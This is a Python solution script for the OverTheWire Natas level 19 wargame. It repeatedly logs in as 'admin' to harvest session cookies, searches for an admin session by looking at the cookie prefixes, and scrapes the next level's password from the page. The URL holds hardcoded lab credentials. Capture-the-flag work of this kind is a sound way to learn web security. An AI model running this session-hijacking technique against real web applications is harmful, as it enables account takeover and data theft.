import requests
import json

url = "http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org"

max_id = 640
admin_suffix = "d61646d696e"

prefixes = []
count = 0


while True:
	try :
		# Retrieve valid cookie by login in
		s = requests.Session()
		r = s.post(url, data={'username':'admin', 'password':'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'})
		session_id = list(r.cookies.get_dict().values())[0]

		prefix = session_id.replace(admin_suffix, '')
		prefixes.append(prefix)

		# Try to access page with the cookie
		r = s.get(url)

		invalid_session = "Please login" in r.text
		regular_user = "regular user" in r.text
		print(f"[{count}] Trying session id {session_id} -- {'Regular user' if regular_user else ''} {'Invalid session' if invalid_session else ''}")

		if not regular_user and not invalid_session:
			print("Found valid session id !")
			print(r.text)
			password = r.text.split('Password: ')[1].split("</pre>")[0]
			print(f"Natas20 password is {password}")
			break

		s.close()
		count += 1

	except KeyboardInterrupt:
		break


with open('prefixes.json', 'w') as f:
	json.dump(prefixes, f)

